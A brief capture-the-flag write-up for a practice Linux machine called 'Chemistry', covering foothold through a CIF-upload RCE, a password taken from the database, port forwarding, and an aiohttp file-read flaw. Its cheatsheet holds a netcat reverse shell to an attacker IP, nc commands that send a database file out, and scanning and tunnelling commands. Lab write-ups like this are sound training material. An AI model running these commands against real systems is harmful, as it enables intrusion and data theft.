# Chemistry \[Linux Easy]

## Report

Find a website which accepts CIF file upload, a google search shows a CVE RCE for CIF files using the python library. Get reverse shell&#x20;

Scan the app to find database and retrieve rosa password to get user.txt

Internal scan reveals an http open on 8080 restricted to localhost access, use port forwarding.

Website doesn't have anything promising, curl for headers and find aiohttp server running which has a recent LFI CVE

Fuzz for directories and use it in the PoC script available online.

## Cheatsheet

<pre class="language-bash"><code class="lang-bash">sudo nmap -sC -sV -O 10.10.11.38
threader3000
<strong>busybox nc 10.10.14.42 4445 -e /bin/bash
</strong>nc -lvnp 3333 > database
nc 10.10.14.42 3333 &#x3C; database.db
sqlitebrowser database
netstat -tulpn
netstat -a
ssh -L 9090:localhost:8080 rosa@10.10.11.38 -fN
curl localhost:8080 --head
#Run the script after wfuzz to get directory
</code></pre>

## Proof

Not much to work with on this one so no worries

## Moral

* Try all the payloads from revshells, one might click (/bin/bash instead of sh too)
* Sort the ssh port forwarding lmao cus what was that
* Curl for the headers, finding the backend info is very useful
* Don't forget basic web methodology even after initial foothold, don't crash out
